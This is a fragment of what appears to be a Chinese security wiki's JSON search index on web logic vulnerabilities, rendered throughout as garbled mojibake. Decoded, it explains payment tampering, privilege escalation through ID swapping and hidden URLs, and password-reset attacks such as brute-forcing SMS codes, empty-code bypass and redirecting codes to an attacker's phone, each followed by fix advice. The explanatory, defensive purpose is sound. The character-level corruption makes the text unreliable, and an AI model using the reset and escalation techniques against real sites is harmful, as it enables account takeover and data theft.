ç§˜é’¥æ³„æ¼#å†…ç½®æ”¯ä»˜åŠŸèƒ½çš„appä¸ºäº†è®¾è®¡ä¸Šçš„æ–¹ä¾¿æœ‰å¯èƒ½ä¼šæŠŠMd5æˆ–è€…æ˜¯RSAçš„ç§é’¥æ³„æ¼å¯¼è‡´æ”»å‡»è€…åç¼–è¯‘apkä¹‹åè·å–å¯†é’¥ä¿¡æ¯ä½¿å¾—äº¤æ˜“ä¿¡æ¯å¯ä»¥è¢«ç¯¡æ”¹ã€‚13.å‡½æ•°ä¿®æ”¹ï¼šapkåç¼–è¯‘ä¹‹åçš„å‡½æ•°ä¿®æ”¹ï¼Œå¯èƒ½å¯¼è‡´å•†å®¶åœ¨æœ€åä¸€æ­¥å‘æ”¯ä»˜æ–¹æäº¤è®¢å•æ—¶æœªéªŒè¯ä¿¡æ¯çš„å‡†ç¡®æ€§ï¼Œä»ç„¶è¢«ç¯¡æ”¹ã€‚ ä¿®å¤å»ºè®®# ç”Ÿæˆæ•°æ®ç­¾åï¼Œå¯¹ç”¨æˆ·é‡‘é¢å’Œè®¢å•ç­¾å æ•æ„Ÿå‚æ•°ä¸è¦æ”¾åœ¨urlä¸­ æœåŠ¡ç«¯æ ¡éªŒè¿‡æ»¤å®¢æˆ·ç«¯æäº¤çš„å‚æ•° åœ¨æœåŠ¡ç«¯è®¡ç®—é‡‘é¢çš„æ—¶å€™ï¼Œä¸€å®šè¦åˆ¤æ–­æ˜¯å¦ä¸ºæ­£æ•° æ”¯ä»˜è¿‡ç¨‹ä¸­åŠ ä¸€ä¸ªæœåŠ¡å™¨ç”Ÿæˆçš„keyï¼Œç”¨æˆ·æ ¡éªŒå‚æ•°æœ‰æ²¡æœ‰è¢«ç¯¡æ”¹ ç”¨urlä¼ é€’ç›¸å…³å‚æ•°ï¼Œåç«¯è¿›è¡Œæ•°å­—éªŒè¯ è®¢å•é‡‘é¢å’Œå……å€¼æ¥å£è¿”å›çš„æ•°æ®è¿›è¡Œæ ¡éªŒ æäº¤è®¢å•æ—¶åå°åˆ¤æ–­å•ä»·æ˜¯å¦ä¸æ•°æ®åº“ä¸­ç›¸ç¬¦ï¼Œè‹¥ä¸ç¬¦åˆ™è¿”å›æ•°æ® æ”¯ä»˜æ—¶åº”ä»æœåŠ¡å™¨æ‹‰å–æ•°æ®ï¼Œè€Œä¸æ˜¯ç›´æ¥è¯»å–å®¢æˆ·ç«¯çš„å€¼"},{"title":"è¶Šæƒ","path":"/wiki/WebçŸ¥è¯†ç‚¹/é€»è¾‘è¶Šæƒ/è¶Šæƒ.html","content":"é€»è¾‘è¶Šæƒ æ°´å¹³å‚ç›´ å‚ç›´è¶Šæƒ:æ·»åŠ ç”¨æˆ· å‰ææ¡ä»¶:è·å–çš„æ·»åŠ ç”¨æˆ·çš„æ•°æ®åŒ…æ€ä¹ˆæ¥çš„æ•°æ®åŒ…: 1.æ™®é€šç”¨æˆ·å‰ç«¯æœ‰æ“ä½œç•Œé¢å¯ä»¥æŠ“å–æ•°æ®åŒ… 2.é€šè¿‡ç½‘ç«™æºç æœ¬åœ°æ­å»ºè‡ªå·±å»æ¨¡æ‹ŸæŠ“å– 3.ç›²çŒœ é€»è¾‘æ¼æ´ç®€ä»‹é€»è¾‘æ¼æ´å°±æ˜¯æŒ‡æ”»å‡»è€…åˆ©ç”¨ä¸šåŠ¡åŠŸèƒ½ä¸Šçš„è®¾è®¡ç¼ºé™·ï¼Œè·å–æ•æ„Ÿä¿¡æ¯æˆ–ç ´åä¸šåŠ¡çš„å®Œæ•´æ€§ã€‚ä¸€èˆ¬å‡ºç°åœ¨å¯†ç ä¿®æ”¹ã€è¶Šæƒè®¿é—®ã€å¯†ç æ‰¾å›ã€äº¤æ˜“æ”¯ä»˜é‡‘é¢ç­‰åŠŸèƒ½å¤„ã€‚ é€»è¾‘æ¼æ´çš„ç ´åæ–¹å¼å¹¶éæ˜¯å‘ç¨‹åºæ·»åŠ ç ´åå†…å®¹ï¼Œè€Œæ˜¯åˆ©ç”¨é€»è¾‘å¤„ç†ä¸ä¸¥å¯†æˆ–ä»£ç é—®é¢˜æˆ–å›ºæœ‰ä¸è¶³ã€‚æ“ä½œä¸Šå¹¶ä¸å½±å“ç¨‹åºè¿è¡Œï¼Œåœ¨é€»è¾‘ä¸Šæ˜¯é¡ºåˆ©æ‰§è¡Œçš„ã€‚ è¿™ç§æ¼æ´ä¸€èˆ¬çš„é˜²æŠ¤æ‰‹æ®µæˆ–è®¾å¤‡æ— æ³•é˜»æ­¢ï¼Œå› ä¸ºèµ°çš„éƒ½æ˜¯åˆæ³•æµé‡ã€‚ä¹Ÿæ²¡æœ‰é˜²æŠ¤æ ‡å‡†ã€‚ é€»è¾‘æ¼æ´åˆ†ç±»è¶Šæƒæ¼æ´ å¯†ç ä¿®æ”¹ å¯†ç æ‰¾å› éªŒè¯ç ****æ¼æ´ æ”¯ä»˜æ¼æ´ çŸ­ä¿¡****è½°ç‚¸ æŠ•ç¥¨ç§¯åˆ†æŠ½å¥– é€»è¾‘æ¼æ´é‡è¦æ€§å¸¸è§çš„OWASPæ¼æ´ï¼Œé€šè¿‡æ¼æ´æ‰«æå·¥å…·ï¼Œå¤§å¤šæ”¯æŒè‡ªåŠ¨åŒ–æˆ–è€…åŠè‡ªåŠ¨åŒ–æ‰«æå‡ºæ¥ï¼›å¹¶ä¸”ä¼ ç»Ÿçš„å®‰å…¨é˜²å¾¡è®¾å¤‡å’Œæªæ–½æ”¶æ•ˆç”šå¾®ï¼› ä½†é€»è¾‘æ¼æ´å±äºå’Œç³»ç»Ÿè‡ªèº«åŠŸèƒ½å’Œé€»è¾‘æœ‰å…³ç³»çš„æ¼æ´ï¼Œæ¯ä¸€å®¶çš„æ¼æ´å‡ºç°å¯èƒ½å­˜åœ¨ä¸€å®šçš„ç‹¬ç‰¹æ€§ï¼Œå¾ˆéš¾å¤åˆ¶æˆ–è€…é€šè¿‡è§„åˆ™é€šè¿‡è„šæœ¬æ‰«æï¼Œå› æ­¤é€»è¾‘æ¼æ´å¤§å¤šéœ€è¦é…åˆä»£ç å®¡è®¡å’Œæ‰‹åŠ¨æµ‹è¯•æ‰å¯å‘ç°ç›¸å…³æ¼æ´ï¼Œä¹Ÿæ˜¯å·¥å…·æ— æ³•å®Œå…¨æ›¿ä»£äººæ‰€ä½œçš„ä¸€ç±»æ¼æ´ï¼› è¶Šæƒæ¼æ´æ¦‚å¿µè¶Šæƒè®¿é—®ï¼ˆBroken Access Controlï¼Œç®€ç§°BACï¼‰æ˜¯Webåº”ç”¨ç¨‹åºä¸­ä¸€ç§å¸¸è§çš„æ¼æ´ï¼Œç”±äºå…¶å­˜åœ¨èŒƒå›´å¹¿ã€å±å®³å¤§ï¼Œè¢«OWASPåˆ—ä¸ºWebåº”ç”¨åå¤§å®‰å…¨éšæ‚£çš„ç¬¬äºŒåã€‚ è¯¥æ¼æ´æ˜¯æŒ‡åº”ç”¨åœ¨æ£€æŸ¥æˆæƒæ—¶å­˜åœ¨çº°æ¼ï¼Œä½¿å¾—æ”»å‡»è€…åœ¨è·å¾—ä½æƒé™ç”¨æˆ·è´¦æˆ·åï¼Œåˆ©ç”¨ä¸€äº›æ–¹å¼ç»•è¿‡æƒé™æ£€æŸ¥ï¼Œè®¿é—®æˆ–è€…æ“ä½œå…¶ä»–ç”¨æˆ·æˆ–è€…æ›´é«˜æƒé™ã€‚è¶Šæƒæ¼æ´çš„æˆå› ä¸»è¦æ˜¯å› ä¸ºå¼€å‘äººå‘˜åœ¨å¯¹æ•°æ®è¿›è¡Œå¢ã€åˆ ã€æ”¹ã€æŸ¥è¯¢æ—¶å¯¹å®¢æˆ·ç«¯è¯·æ±‚çš„æ•°æ®è¿‡åˆ†ç›¸ä¿¡è€Œé—æ¼äº†æƒé™çš„åˆ¤å®šï¼Œä¸€æ—¦æƒé™éªŒè¯ä¸å……åˆ†ï¼Œå°±æ˜“è‡´è¶Šæƒæ¼æ´ã€‚ å…¶ä¸­è¶Šæƒè®¿é—®åˆ†ä¸ºï¼š æ°´å¹³è¶Šæƒ å‚ç›´è¶Šæƒ åˆ†ç±»æ°´å¹³è¶Šæƒï¼šç›¸åŒçº§åˆ«ï¼ˆæƒé™ï¼‰çš„ç”¨æˆ·æˆ–è€…åŒä¸€è§’è‰²ä¸­ä¸åŒçš„ç”¨æˆ·ä¹‹é—´ï¼Œå¯ä»¥è¶Šæƒè®¿é—®ã€ä¿®æ”¹æˆ–è€…åˆ é™¤å…¶ä»–ç”¨æˆ·ä¿¡æ¯çš„éæ³•æ“ä½œã€‚å¦‚æœå‡ºç°æ­¤æ¼æ´ï¼Œå¯èƒ½ä¼šé€ æˆå¤§æ‰¹é‡æ•°æ®çš„ æ³„éœ²ï¼Œä¸¥é‡çš„ç”šè‡³ä¼šé€ æˆç”¨æˆ·ä¿¡æ¯è¢«æ¶æ„ç¯¡æ”¹ã€‚ **æ°´å¹³è¶Šæƒï¼š**æŒ‡æ”»å‡»è€…å°è¯•è®¿é—®ä¸ä»–æ‹¥æœ‰ç›¸åŒæƒé™çš„ç”¨æˆ·èµ„æºã€‚ä¾‹å¦‚ï¼Œç”¨æˆ·Aå’Œç”¨æˆ·Bå±äºåŒä¸€è§’è‰²ï¼Œæ‹¥æœ‰ç›¸åŒçš„æƒé™ç­‰çº§ï¼Œä»–ä»¬èƒ½è·å–è‡ªå·±çš„ç§æœ‰æ•°æ®ï¼ˆæ•°æ®Aå’Œæ•°æ®Bï¼‰ï¼Œä½†å¦‚æœç³»ç»ŸåªéªŒè¯äº†èƒ½è®¿é—®æ•°æ®çš„è§’è‰²ï¼Œè€Œæ²¡æœ‰å¯¹æ•°æ®åšç»†åˆ†æˆ–è€…æ ¡éªŒï¼Œå¯¼è‡´ç”¨æˆ·Aèƒ½è®¿é—®åˆ°ç”¨æˆ·Bçš„æ•°æ®ï¼ˆæ•°æ®Bï¼‰ï¼Œé‚£ä¹ˆç”¨æˆ·Aè®¿é—®æ•°æ®Bçš„è¿™ç§è¡Œä¸ºå°±å«åšæ°´å¹³è¶Šæƒè®¿é—® å‚ç›´è¶Šæƒ ï¼šå°±æ˜¯ä¸åŒçº§åˆ«ä¹‹é—´çš„ç”¨æˆ·æˆ–ä¸åŒè§’è‰²ä¹‹é—´ç”¨æˆ·çš„è¶Šæƒï¼Œæ¯”å¦‚æ™®é€šç”¨æˆ·å¯ä»¥æ‰§è¡Œç®¡ç†å‘˜æ‰èƒ½æ‰§è¡Œçš„åŠŸèƒ½ã€‚ å‚ç›´è¶Šæƒï¼šç”±äºåå°åº”ç”¨æ²¡æœ‰åšæƒé™æ§åˆ¶ï¼Œæˆ–ä»…ä»…åœ¨èœå•ã€æŒ‰é’®ä¸Šåšäº†æƒé™æ§åˆ¶ï¼Œå¯¼è‡´æ¶æ„ç”¨æˆ·åªè¦çŒœæµ‹å…¶ä»–ç®¡ç†é¡µé¢çš„URLæˆ–è€…æ•æ„Ÿçš„å‚æ•°ä¿¡æ¯ï¼Œå°±å¯ä»¥è®¿é—®æˆ–æ§åˆ¶å…¶ä»–è§’è‰²æ‹¥æœ‰çš„æ•°æ®æˆ–é¡µé¢ï¼Œè¾¾åˆ°æƒé™æå‡çš„ç›®çš„ã€‚ äº§ç”ŸåŸå› æ°´å¹³è¶Šæƒå’Œå‚ç›´è¶Šæƒçš„å®šä¹‰ä¸ä¸€æ ·ï¼Œä½†æ¼æ´åŸç†æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯è´¦æˆ·ä½“ç³»ä¸Šåœ¨åˆ¤æ–­æƒé™æ—¶ä¸ä¸¥æ ¼å¯¼è‡´å­˜åœ¨ç»•è¿‡æ¼æ´ï¼Œè¿™ä¸€ç±»çš„ç»•è¿‡é€šå¸¸å‘ç”Ÿåœ¨cookieéªŒè¯ä¸ä¸¥ã€ç®€å•åˆ¤æ–­ç”¨æˆ·æäº¤çš„å‚æ•°ï¼Œå½’æ ¹ç»“åº•ï¼Œéƒ½æ˜¯å› ä¸ºè¿™äº›å‚æ•°æ˜¯åœ¨å®¢æˆ·ç«¯æäº¤ï¼ŒæœåŠ¡ç«¯æœªä¸¥æ ¼æ ¡éªŒã€‚ 1.é€šè¿‡éšè—URL å®ç°æ§åˆ¶è®¿é—®æœ‰äº›ç¨‹åºçš„ç®¡ç†å‘˜çš„ç®¡ç†é¡µé¢åªæœ‰ç®¡ç†å‘˜æ‰æ˜¾ç¤ºï¼Œæ™®é€šç”¨æˆ·çœ‹ä¸åˆ°ï¼Œåˆ©ç”¨ URL å®ç°è®¿é—®æ§åˆ¶ï¼Œä½†URL æ³„éœ²æˆ–è¢«æ¶æ„æ”»å‡»è€…çŒœåˆ°åï¼Œè¿™ä¼šå¯¼è‡´è¶Šæƒæ”»å‡»ã€‚ 2.ç›´æ¥å¯¹è±¡å¼•ç”¨ è¿™ç§é€šè¿‡ä¿®æ”¹ä¸€ä¸‹å‚æ•°å°±å¯ä»¥äº§ç”Ÿæ°´å¹³è¶Šæƒï¼Œä¾‹å¦‚æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯é¡µé¢ URL ååŠ ä¸Šè‡ªå·±çš„ id ä¾¿å¯æŸ¥çœ‹ï¼Œå½“ä¿®æ”¹ä¸ºä»–äººçš„ ID å·æ—¶ä¼šè¿”å›ä»–äººçš„ä¿¡æ¯ï¼Œä¾¿äº§ç”Ÿäº†æ°´å¹³è¶Šæƒã€‚ 3.å¤šé˜¶æ®µåŠŸèƒ½ å¤šé˜¶æ®µåŠŸèƒ½æ˜¯ä¸€ä¸ªåŠŸèƒ½æœ‰å¤šä¸ªé˜¶æ®µçš„å®ç°ã€‚ä¾‹å¦‚ä¿®æ”¹å¯†ç ï¼Œå¯èƒ½ç¬¬ä¸€æ­¥æ˜¯éªŒè¯ç”¨æˆ·èº«ä»½ä¿¡æ¯ï¼Œå·ç éªŒè¯ç ç±»çš„ã€‚ å½“éªŒè¯æˆåŠŸåï¼Œè·³åˆ°ç¬¬äºŒæ­¥ï¼Œè¾“å…¥æ–°å¯†ç ï¼Œå¾ˆå¤šç¨‹åºä¼šåœ¨è¿™ä¸€æ­¥ä¸å†éªŒè¯ç”¨æˆ·èº«ä»½ï¼Œå¯¼è‡´æ¶æ„æ”»å‡»è€…æŠ“åŒ…ç›´æ¥ä¿®æ”¹å¯†ç ã€‚ 4.é™æ€æ–‡ä»¶ å¾ˆå¤šç½‘ç«™çš„ä¸‹è½½åŠŸèƒ½ï¼Œä¸€äº›è¢«ä¸‹è½½çš„é™æ€æ–‡ä»¶ï¼Œä¾‹å¦‚ pdfã€wordã€xls ç­‰ï¼Œå¯èƒ½åªæœ‰ä»˜è´¹ç”¨æˆ·æˆ–ä¼šå‘˜å¯ä¸‹è½½ï¼Œä½†å½“è¿™äº›æ–‡ä»¶çš„ URL åœ°å€æ³„éœ²åï¼Œå¯¼è‡´ä»»ä½•äººå¯ä¸‹è½½ï¼Œå¦‚æœçŸ¥é“ URL å‘½åè§„åˆ™ï¼Œåˆ™ä¼šä¾¿åˆ©æœåŠ¡å™¨çš„æ”¶è´¹æ–‡æ¡£è¿›è¡Œæ‰¹é‡ä¸‹è½½ã€‚ 5.å¹³å°é…ç½®é”™è¯¯ ä¸€äº›ç¨‹åºä¼šé€šè¿‡æ§ä»¶æ¥é™åˆ¶ç”¨æˆ·çš„è®¿é—®ï¼Œä¾‹å¦‚åå°åœ°å€ï¼Œæ™®é€šç”¨æˆ·ä¸å±äºç®¡ç†å‘˜ç»„ï¼Œåˆ™ä¸èƒ½è®¿é—®ã€‚ä½†å½“é…ç½®å¹³å°æˆ–é…ç½®æ§ä»¶é”™è¯¯æ—¶ï¼Œå°±ä¼šå‡ºç°è¶Šæƒè®¿é—®ã€‚ ä¿®å¤å»ºè®®1ã€å‰åç«¯åŒæ—¶å¯¹ç”¨æˆ·è¾“å…¥ä¿¡æ¯è¿›è¡Œæ ¡éªŒï¼ŒåŒé‡éªŒè¯æœºåˆ¶ 2ã€ æ‰§è¡Œå…³é”®æ“ä½œå‰å¿…é¡»éªŒè¯ç”¨æˆ·èº«ä»½ï¼ŒéªŒè¯ç”¨æˆ·æ˜¯å¦å…·å¤‡æ“ä½œæ•°æ®çš„æƒé™ 3ã€ç‰¹åˆ«æ•æ„Ÿæ“ä½œå¯ä»¥è®©ç”¨æˆ·å†æ¬¡è¾“å…¥å¯†ç æˆ–å…¶ä»–çš„éªŒè¯ä¿¡æ¯ã€‚ 4ã€å¯ä»¥ä»ç”¨æˆ·çš„åŠ å¯†è®¤è¯ cookie ä¸­è·å–å½“å‰ç”¨æˆ· idï¼Œé˜²æ­¢æ”»å‡»è€…å¯¹å…¶ä¿®æ”¹ã€‚ æˆ–åœ¨ sessionã€cookie ä¸­åŠ å…¥ä¸å¯é¢„æµ‹ã€ä¸å¯çŒœè§£çš„ user ä¿¡æ¯ã€‚ 5ã€ç›´æ¥å¯¹è±¡å¼•ç”¨çš„åŠ å¯†èµ„æºIDï¼Œé˜²æ­¢æ”»å‡»è€…æšä¸¾IDï¼Œæ•æ„Ÿæ•°æ®ç‰¹æ®ŠåŒ–å¤„ç† 6ã€æ°¸è¿œä¸è¦ç›¸ä¿¡æ¥è‡ªç”¨æˆ·çš„è¾“å…¥ï¼Œå¯¹äºå¯æ§å‚æ•°è¿›è¡Œä¸¥æ ¼çš„æ£€æŸ¥ä¸è¿‡æ»¤ å¯†ç é‡ç½®æ¼æ´æ¦‚å¿µä»€ä¹ˆæ˜¯å¯†ç é‡ç½®ï¼Ÿ é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ä¿®æ”¹æ‰åŸæ¥çš„å¯†ç ï¼›å¯†ç é‡ç½®çš„é€”å¾„æœ‰å“ªäº›ï¼Ÿ 1ã€ä¸€ä¸ªç½‘ç«™ï¼Œä¸€èˆ¬æˆ‘ä»¬å¯ä»¥ç™»å½•è¿›å…¥ä¸ªäººä¸­å¿ƒï¼Œç›´æ¥ä¿®æ”¹å¯†ç ï¼› 2ã€å½“æˆ‘ä»¬å¿˜è®°å¯†ç æ˜¯è¿˜å¯ä»¥ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„å¯†ç æ‰¾å›åŠŸèƒ½è¿›è¡Œå¯†ç ä¿®æ”¹ï¼› ä»€ä¹ˆæ˜¯å¯†ç é‡ç½®æ¼æ´ï¼Ÿ å¯†ç é‡ç½®è¿™ä¸ªåŠŸèƒ½æœ¬èº«æ²¡æœ‰é—®é¢˜ï¼Œä½†å¦‚è¿‡å¯¹å¯†ç é‡ç½®åŠŸèƒ½çš„éªŒè¯æœºåˆ¶ä¸å¤Ÿå®Œå–„å°±å½¢æˆäº†æ¼æ´ï¼› æˆå› ä¸€ã€åŸºäºä¿®æ”¹å¯†ç çš„ å¦‚æœåå°æ²¡æœ‰å¯¹æ—§å¯†ç è¿›è¡ŒéªŒè¯ï¼Œå°±ç›´æ¥è®©è¾“å…¥æ–°å¯†ç  1ã€ç¬¬ä¸€ç§æ–¹å¼ï¼Œå¦‚æœå­˜åœ¨CSRFæ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ä¸€æ³¢; 2ã€å¦‚æœå­˜åœ¨è¶Šæƒæ¼æ´ï¼Œå°±å¯ä»¥ç›´æ¥ä¿®æ”¹å…¶ä»–äººçš„å¯†ç ; 3ã€ç‚¹å‡»ä¿®æ”¹åæŠ“åŒ…æµ‹è¯•ï¼Œè§‚å¯Ÿæ•°æ®åº“åŒ…æœ‰æ²¡æœ‰éªŒè¯ç±»ä¼¼cookieéšæœºæ•°ï¼Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œå¯ä»¥å°è¯•ä¿®æ”¹ç”¨æˆ·åã€æ‰‹æœºå·æˆ–è€…uidæ¥å°è¯•é‡ç½®å…¶ä»–å¯†ç ; å¦‚æœåå°æ˜¯é€šè¿‡å‘æ³¨å†Œæ‰‹æœºæˆ–è€…æ³¨å†Œé‚®ç®±æ¥é‡ç½®å¯†ç çš„ï¼Œå…³äºéªŒè¯ç çš„æ¼æ´æˆ‘ä»¬éƒ½å¯ä»¥å°è¯•ï¼Œè¿™ç§æ–¹å¼çš„å‰ææ˜¯ä½ å·²ç»é€šè¿‡æŸç§æ–¹å¼è¿›å…¥åˆ°äº†å¯¹æ–¹çš„ä¸ªäººä¸­å¿ƒï¼Œæ‰€ä»¥æ„ä¹‰ä¸å¤ªå¤§. äºŒã€åŸºäºæ‰¾å›å¯†ç çš„ ä¸€èˆ¬æƒ…å†µä¸‹å½“æˆ‘ä»¬ç‚¹å‡»æ‰¾å›å¯†ç çš„æ—¶å€™éƒ½æ˜¯é€šè¿‡éªŒè¯æ‰‹æœºå·æˆ–è€…éªŒè¯é‚®ç®±ï¼Œè¿™å°±åˆå˜æˆäº†éªŒ è¯ç çš„é—®é¢˜; \\1.éªŒè¯ç å‘é€åå‰ç«¯è¿”å› \\2. æœªé™åˆ¶éªŒè¯ç æ¬¡æ•°å¯¼è‡´éªŒè¯ç çˆ†ç ´ \\3. éªŒè¯ç æœ‰è§„å¾‹æˆ–å¯æ§ \\4. éªŒè¯ç è¢«æ”¾åœ¨è¿”å›åŒ…ä¸­ \\5. è¾“å…¥éªŒè¯ç åé€šè¿‡ä¿®æ”¹å“åº”åŒ…çš„çŠ¶æ€æ¥é‡ç½®å¯†ç  \\6. éªŒè¯ç ä¸ºç©ºï¼ˆåŸç†å°±æ˜¯åå°æœªè€ƒè™‘éªŒè¯ç ä¸ºç©ºçš„æƒ…å†µï¼Œç›´æ¥å°±æ˜¯å¦‚æœå­˜åœ¨ï¼Œç„¶åä¸‹é¢ä»… åˆ¤æ–­äº†å­˜åœ¨çš„æƒ…å†µï¼‰ç»•è¿‡æˆ–è€…ä¸‡èƒ½éªŒè¯ç  \\7. æ‹¦æˆªæ•°æ®åŒ…ï¼Œå‘é€éªŒè¯ç æ—¶å¯ä»¥å‘å¤šä¸ªæ‰‹æœºå·å‘é€éªŒè¯ç ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥æ·»åŠ ä¸ªäº‘çŸ­ä¿¡ï¼Œç›´æ¥æ¥å—éªŒè¯ç å®Œæˆä¿®æ”¹ç­‰ç­‰ å¯†ç æ‰¾å›æ¼æ´å¯†ç æ‰¾å›æ˜¯å‡ºç°é€»è¾‘æ¼æ´é—®é¢˜æœ€å¤šçš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå› ä¸ºå®ƒçš„äº¤äº’æµç¨‹æœ€å¤šï¼Œç›®å‰æ‰¾å›å¯†ç çš„æ–¹å¼æ¯”è¾ƒå¸¸è§çš„æœ‰é‚®ç®±éªŒè¯ç ã€æ‰‹æœºéªŒè¯ç ä»¥åŠå¯†ä¿é—®é¢˜ï¼Œ 1.è¾“å…¥ç”¨æˆ·åé‚®ç®±æ”¶æœºé˜¶æ®µ äº¤äº’è¿‡ç¨‹ï¼šå³è¾“å…¥è¦é‡ç½®çš„è´¦å·ä¿¡æ¯ï¼Œç‚¹å‡»ç¡®å®šæ—¶ï¼Œå¤§éƒ¨åˆ†åº”ç”¨ä¼šç›´æ¥ä»æ•°æ®åº“ä¸­è¯»å–ç”¨æˆ·é‚®ç®±å’Œæ‰‹æœºä¿¡æ¯ï¼Œå¹¶ä¸”å‘é€éªŒè¯ç ï¼Œè¿˜æœ‰éƒ¨åˆ†ç¨‹åºåœ¨è¾“å…¥ç”¨æˆ·ååï¼Œä¼šæç¤ºä½¿ç”¨æ‰‹æœºè¿˜æ˜¯é‚®ç®±æ‰¾å›å¯†ç ã€‚ åœ¨æäº¤çš„æ—¶å€™å¯ä»¥ç›´æ¥æŠ“åŒ…ä¿®æ”¹æ‰‹æœºæˆ–è€…é‚®ç®±å‚æ•°ï¼Œè¿™æ—¶å¦‚æœåç«¯æ²¡æœ‰åšéªŒè¯ï¼ŒåŸæœ¬å‘é€ç»™è´¦å·Açš„éªŒè¯ç å°±ä¼šå‘é€åˆ°è¢«æˆ‘ä»¬ç¯¡æ”¹çš„æ‰‹æœºæˆ–è€…é‚®ç®±ä¸Šï¼Œåˆ©ç”¨æ¥æ”¶åˆ°çš„éªŒè¯ç å³å¯é‡ç½®å¯†ç ã€‚ 2.å¡«å†™éªŒè¯ç å’Œæ–°å¯†ç é˜¶æ®µ å¡«å†™éªŒè¯ç å’Œæ–°å¯†ç å°±æ„å‘³ç€æˆ‘ä»¬å·²ç»æ‹¿åˆ°äº†éªŒè¯ç æˆ–è€…é‡ç½®å¯†ç çš„URLï¼Œè¿™é‡Œå­˜åœ¨çš„ ä¸»è¦é—®é¢˜æœ‰ï¼š ï¼ˆ1ï¼‰éªŒè¯å‡­è¯è¾ƒç®€å•ï¼Œå¯ä»¥æš´åŠ›ç ´è§£ã€‚ ç›®å‰å¤§å¤šæ•°æ‰‹æœºçŸ­ä¿¡é‡ç½®å¯†ç çš„éªŒè¯ç éƒ½æ˜¯4ä½æˆ–è€…6ä½æ•°å­—ï¼Œå¦‚æœæäº¤éªŒè¯ç çš„åœ°æ–¹æ²¡æœ‰å¯¹è¿™ä¸ªéªŒè¯ç è¿›è¡Œé”™è¯¯æ¬¡æ•°é™åˆ¶ï¼Œåˆ™ä¼šå­˜åœ¨å¯ä»¥çˆ†ç ´çš„é—®é¢˜ï¼Œè¿™æ˜¯ç›®å‰æœ€å¸¸è§çš„ä¸€ç§æ‰¾å›å¯†ç æ¼æ´åˆ©ç”¨æ–¹å¼ã€‚ ï¼ˆ2ï¼‰éªŒè¯å‡­è¯ç®—æ³•ç®€å•ï¼Œå‡­è¯å¯é¢„æµ‹ã€‚ éƒ¨åˆ†ç½‘ç«™æ‰¾å›å¯†ç çš„Tokenæ˜¯æ ¹æ®å½“å‰ç”¨æˆ·çš„â€œç”¨æˆ·å+é‚®ç®±â€æˆ–è€…æ—¶é—´æˆ³è¿›è¡Œä¸€æ¬¡MD5åç”Ÿæˆï¼Œè¿™å°±å­˜åœ¨ä¸€å®šå¾—é¢„æµ‹æ€§ï¼Œåˆ©ç”¨è‡ªå·±å†™çš„ç®—æ³•å»ç¢°æ’å³å¯æ‹¿åˆ°äº‰å–åˆ°çš„é‡ç½®å¯†ç å‡­è¯ã€‚ ï¼ˆ3ï¼‰éªŒè¯å‡­è¯ç›´æ¥ä¿å­˜åœ¨æºç é‡Œã€‚ ç›®å‰è¿™ç§æ¯”è¾ƒå°‘ï¼Œä¸è¿‡ä¹Ÿå­˜åœ¨ä¸€å®šæ¯”ä¾‹ï¼Œä¸€ç§æ˜¯åœ¨ç‚¹å‡»å‘é€éªŒè¯ç çš„æ—¶å€™å°±å¯ä»¥ç›´æ¥åœ¨æºç é‡Œçœ‹åˆ°ç»™å½“å‰ç”¨æ‰‹æœºæˆ–è€…é‚®ç®±å‘é€è¿‡å»çš„éªŒè¯ç ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯åœ¨è¾“å…¥éªŒè¯ç çš„æ—¶å€™ï¼Œ æºç é‡Œé¢å°±ç›´æ¥ä¿å­˜äº†æ­£ç¡®çš„éªŒè¯ç ã€‚ 3.å‘é€æ–°å¯†ç é˜¶æ®µ å‡­è¯æœªç»‘å®šç”¨æˆ·ï¼šæˆ‘ä»¬åœ¨æ‰¾å›å¯†ç çš„æ—¶å€™ï¼Œå‘é€åˆ°é‚®ç®±çš„é“¾æ¥é€šå¸¸æ˜¯å¦‚ä¸‹è¿™ä¸ªæ ·å­ï¼šhttp://www.xxx.com/user.php?m=repwduid=ç”¨æˆ·IDkeyå‡­è¯å¯†é’¥emailé‚®ç®± å½“è¯·æ±‚è¿™ä¸ªé“¾æ¥çš„æ—¶å€™ï¼Œåç«¯ç¨‹åºæ ¹æ®uidå’Œkeyå¯¹åº”ä¸Šäº†ä»è€Œåˆ¤æ–­è¿™ä¸ªæ‰¾å›å¯†ç çš„é“¾æ¥æ˜¯å¦æœ‰æ•ˆï¼Œä½†æ˜¯åœ¨å°†æ–°å¯†ç æäº¤åˆ°æœåŠ¡å™¨çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨ç«¯å¹¶æ²¡æœ‰åˆ¤æ–­å½“å‰è¿™ä¸ªkeyæ˜¯å¦è·Ÿuidæˆ–è€…emailåŒ¹é…ï¼Œè€Œæ˜¯ç›´æ¥ä¿®æ”¹æ‰äº†uidæˆ–è€…emailæŒ‡å®šçš„ç”¨æˆ·å¯†ç ï¼Œè¿™æ ·æˆ‘ä»¬åªè¦æ‹¦æˆªä¿®æ”¹å¯†ç çš„è¯·æ±‚åŒ…ï¼Œå°†é‡Œé¢çš„ç”¨æˆ·å‚æ•°ä¿®æ”¹æˆæˆ‘ä»¬è¦ç¯¡æ”¹å¯†ç çš„ç”¨æˆ·è´¦å·å³å¯ã€‚ ä¿®å¤å»ºè®®1.æ¥æ”¶éªŒè¯ç çš„é‚®ç®±å’Œæ‰‹æœºå·ä¸å¯ç”±ç”¨æˆ·æ§åˆ¶ï¼Œåº”è¯¥ç›´æ¥ä»æ•°æ®åº“ä¸­è¯»å–å‡ºæ¥ã€‚ 2.åŠ å¼ºéªŒè¯å‡­è¯å¤æ‚åº¦ï¼Œé˜²æ­¢è¢«æš´åŠ›ç ´è§£ã€‚ 3.é™åˆ¶éªŒè¯å‡­è¯é”™è¯¯æ¬¡æ•°ï¼Œå•ä¸ªç”¨æˆ·åœ¨åŠä¸ªå°æ—¶å†…éªŒè¯ç é”™è¯¯ä¸‰æ¬¡ï¼ŒåŠå°æ—¶å†…ç¦æ­¢æ‰¾å›å¯†ç ã€‚ 4.éªŒè¯å‡­è¯è®¾ç½®å¤±æ•ˆæ—¶é—´ã€‚ 